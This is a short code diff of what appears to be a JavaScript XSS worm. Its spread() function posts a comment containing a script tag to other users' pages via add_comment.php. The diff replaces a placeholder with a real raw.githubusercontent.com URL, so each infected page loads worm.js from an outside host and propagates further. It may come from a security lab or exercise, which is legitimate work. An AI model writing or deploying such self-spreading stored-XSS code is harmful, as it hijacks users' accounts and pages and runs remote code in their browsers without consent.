@@ -18,7 +18,7 @@ $.get("friends.php", function(friends){
 
 // Function to post worm on a person's page
 function spread(id){
-    $.get("add_comment.php", {'id': id, 'comment': "<script src='githubrawcontent'></script>"})
+    $.get("add_comment.php", {'id': id, 'comment': "<script src='https://raw.githubusercontent.com/P0nt14c/web/main/worm.js'></script>"})
 }
 
 function report(id){
